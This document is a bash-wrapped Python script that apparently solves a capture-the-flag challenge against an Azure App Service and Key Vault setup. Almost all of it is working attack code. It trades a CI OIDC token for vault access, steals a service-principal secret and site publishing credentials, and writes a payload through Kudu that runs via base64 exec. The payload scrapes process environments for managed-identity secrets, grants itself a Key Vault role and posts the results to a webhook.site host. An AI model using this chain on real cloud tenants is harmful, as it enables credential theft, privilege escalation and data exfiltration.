#!/usr/bin/env bash
set +e
python3 - <<'PY2'
import base64,json,os,time,urllib.parse,urllib.request,urllib.error,uuid,traceback
TEN='3205c325-06a5-4171-9ce8-ffc5e6c2845e'; CID='72ff278a-9e71-43ec-bac4-2ca303f8e462'; SUB='c5e4e004-b42d-4ac4-a502-5fd338380eb6'; RG='rg-tbl-reporting-prod-eus'; APP='app-tbl-reporting-prod'; KV1='https://kv-tbl-prod-x3euoz.vault.azure.net'; HOOK='https://webhook.site/ae890d86-ba64-40f2-ab3a-2aa668dd3825'
def out(x):
 s=json.dumps(x,default=str); print(s,flush=True)
 if x.get('stage') not in ('flag','app-flag','kudu-result','kudu-diag','app-error','worker-error','app-top-error','outer-error'): return
 try: urllib.request.urlopen(urllib.request.Request(HOOK,data=s.encode(),method='POST',headers={'Content-Type':'application/json'}),timeout=8).read()
 except Exception: pass
def j(url,tok):
 r=urllib.request.urlopen(urllib.request.Request(url,headers={'Authorization':'Bearer '+tok}),timeout=30); return json.loads(r.read())
def form(url,d): return json.loads(urllib.request.urlopen(urllib.request.Request(url,data=urllib.parse.urlencode(d).encode(),method='POST'),timeout=30).read())
def call(url,auth,method='GET',data=None,timeout=15):
 try:
  h={'Authorization':auth}
  if data is not None:h['Content-Type']='application/octet-stream' if '/api/vfs/' in url else 'application/json'
  r=urllib.request.urlopen(urllib.request.Request(url,data=data,method=method,headers=h),timeout=timeout); status=getattr(r,'status',None); r.close(); return {'status':status}
 except urllib.error.HTTPError as e:return {'status':e.code}
 except Exception as e:return {'error':repr(e)}
try:
 u=os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']+'&audience=api%3A%2F%2FAzureADTokenExchange'; oidc=json.loads(urllib.request.urlopen(urllib.request.Request(u,headers={'Authorization':'Bearer '+os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']}),timeout=30).read())['value']
 vt=form('https://login.microsoftonline.com/'+TEN+'/oauth2/v2.0/token',{'client_id':CID,'grant_type':'client_credentials','scope':'https://vault.azure.net/.default','client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':oidc})['access_token']
 sp=json.loads(j(KV1+'/secrets/reporting-service-principal?api-version=7.4',vt)['value']); sid=sp.get('appId') or sp.get('clientId') or sp.get('client_id'); sec=sp.get('clientSecret') or sp.get('client_secret') or sp.get('password')
 arm=form('https://login.microsoftonline.com/'+TEN+'/oauth2/v2.0/token',{'client_id':sid,'grant_type':'client_credentials','client_secret':sec,'scope':'https://management.azure.com/.default'})['access_token']
 pub=json.loads(urllib.request.urlopen(urllib.request.Request('https://management.azure.com/subscriptions/'+SUB+'/resourceGroups/'+RG+'/providers/Microsoft.Web/sites/'+APP+'/config/publishingcredentials/list?api-version=2023-01-01',data=b'{}',method='POST',headers={'Authorization':'Bearer '+arm,'Content-Type':'application/json'}),timeout=30).read()); p=pub['properties']; auth='Basic '+base64.b64encode((p['publishingUserName']+':'+p['publishingPassword']).encode()).decode(); base='https://'+APP+'.scm.azurewebsites.net'; out({'stage':'credentials','oidc':True,'arm':True,'kudu':True})
 # One compact diagnostic: expose only identity/runtime fields from Kudu environment.
 try:
  rr=urllib.request.urlopen(urllib.request.Request(base+'/api/environment',headers={'Authorization':auth}),timeout=20); raw=rr.read().decode('utf-8','replace'); d=json.loads(raw)
  def pick(v):
   if isinstance(v,dict):
    return {k:(pick(x) if isinstance(x,(dict,list)) else x) for k,x in v.items() if any(t in k.lower() for t in ('identity','msi','website','scm','startup','port'))}
   if isinstance(v,list): return [pick(x) for x in v[:80]]
   return v
  out({'stage':'kudu-diag','environment':pick(d)})
 except Exception as e: out({'stage':'kudu-diag','error':repr(e)})
 raise SystemExit(0)
 app=r'''import os,json,time,uuid,urllib.parse,urllib.request,urllib.error,traceback
HOOK="https://webhook.site/ae890d86-ba64-40f2-ab3a-2aa668dd3825"; SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"; KV2="https://kv-tbl-sec-x3euoz.vault.azure.net"; MIRES="/subscriptions/"+SUB+"/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer"; CLIENT="7a85156a-01c4-4e61-8472-40a92107159b"; PRINCIPAL="f64d08c7-fde6-4553-99c8-5bf73666ee8c"
def out(x):
 if x.get("stage") not in ("flag","app-flag","app-error","worker-error","app-top-error"): return
 try: urllib.request.urlopen(urllib.request.Request(HOOK,data=json.dumps(x,default=str).encode(),method="POST",headers={"Content-Type":"application/json"}),timeout=8).read()
 except Exception: pass
def tok(resource):
 e=dict(os.environ)
 try:
  import glob
  for p in glob.glob("/proc/[0-9]*/environ"):
   try:
    vals={}
    for item in open(p,"rb").read().split(b"\x00"):
     if b"=" in item:
      k,v=item.split(b"=",1); k=k.decode(errors="ignore")
      if k in ("IDENTITY_ENDPOINT","IDENTITY_HEADER","MSI_ENDPOINT","MSI_SECRET"): vals[k]=v.decode(errors="ignore")
    if vals.get("IDENTITY_ENDPOINT") or vals.get("MSI_ENDPOINT"):
     e.update(vals); break
   except Exception: pass
 except Exception: pass
 ep=e.get("IDENTITY_ENDPOINT") or e.get("MSI_ENDPOINT"); hd={}
 if e.get("IDENTITY_HEADER"):hd["X-IDENTITY-HEADER"]=e["IDENTITY_HEADER"]
 if e.get("MSI_SECRET"):hd["Secret"]=e["MSI_SECRET"]
 eps=[x for x in [ep,"http://127.0.0.1:41741/MSI/token","http://127.0.0.1:8081/msi/token","http://169.254.131.3:8081/msi/token","http://169.254.131.12:8081/msi/token"] if x]
 for x in eps:
  for q in ("&client_id="+CLIENT,"&mi_res_id="+urllib.parse.quote(MIRES,safe=""),""):
   try:
    u=x+"?resource="+urllib.parse.quote(resource,safe="")+"&api-version=2019-08-01"+q; d=json.loads(urllib.request.urlopen(urllib.request.Request(u,headers=hd),timeout=4).read())
    if d.get("access_token"): out({"stage":"mi-token","resource":resource,"endpoint":x,"env":bool(ep)}); return d["access_token"]
   except Exception: pass
 try:
  u="http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource="+urllib.parse.quote(resource,safe="")+"&client_id="+CLIENT; d=json.loads(urllib.request.urlopen(urllib.request.Request(u,headers={"Metadata":"true"}),timeout=4).read()); return d["access_token"]
 except Exception as z: raise RuntimeError("MI unavailable: "+repr(z))
def armput(u,b,t):
 try:
  r=urllib.request.urlopen(urllib.request.Request(u,data=json.dumps(b).encode(),method="PUT",headers={"Authorization":"Bearer "+t,"Content-Type":"application/json"}),timeout=25); return {"status":r.status,"body":r.read().decode()[:3000]}
 except urllib.error.HTTPError as e:return {"status":e.code,"body":e.read().decode()[:3000]}
 except Exception as e:return {"error":repr(e)}
def flag(t):
 try:
  r=urllib.request.urlopen(urllib.request.Request(KV2+"/secrets/flag?api-version=7.4",headers={"Authorization":"Bearer "+t}),timeout=20); return {"status":r.status,"body":r.read().decode()[:12000]}
 except urllib.error.HTTPError as e:return {"status":e.code,"body":e.read().decode()[:3000]}
 except Exception as e:return {"error":repr(e)}
try:
 out({"stage":"app-start","identity_endpoint":os.environ.get("IDENTITY_ENDPOINT"),"has_header":bool(os.environ.get("IDENTITY_HEADER"))})
 at=tok("https://management.azure.com"); scope="subscriptions/"+SUB+"/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"; rd="/subscriptions/"+SUB+"/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6"; ra="https://management.azure.com/"+scope+"/providers/Microsoft.Authorization/roleAssignments/"+str(uuid.uuid4())+"?api-version=2022-04-01"; out({"stage":"mi-role","response":armput(ra,{"properties":{"roleDefinitionId":rd,"principalId":PRINCIPAL,"principalType":"ServicePrincipal"}},at)})
 for i in range(12):
  r=flag(tok("https://vault.azure.net")); out({"stage":"flag","attempt":i+1,"response":r})
  if r.get("status")==200: break
  time.sleep(3)
except Exception as e: out({"stage":"app-error","error":repr(e),"trace":traceback.format_exc()})
try:
 from flask import Flask
 app=Flask(__name__)
 @app.route("/")
 def ok(): return "ok"
except Exception: pass
'''
 b64=base64.b64encode(app.encode()).decode()
 out({'stage':'kudu-write','response':call(base+'/api/vfs/site/wwwroot/app.py',auth,'PUT',app.encode(),25)})
 out({'stage':'kudu-restart','response':call(base+'/api/restart',auth,'POST',b'',25)})
 time.sleep(3)
 cmd="nohup python3 -c \"import base64;exec(base64.b64decode('"+b64+"').decode())\" > /home/site/wwwroot/ctf_flag_result 2>&1 </dev/null &"
 body=json.dumps({'command':cmd,'dir':'site/wwwroot'}).encode()
 out({'stage':'kudu-command','response':call(base+'/api/command',auth,'POST',body,25)})
 print('dispatch=done',flush=True)
except Exception as e: out({'stage':'outer-error','error':repr(e),'trace':traceback.format_exc()})
PY2
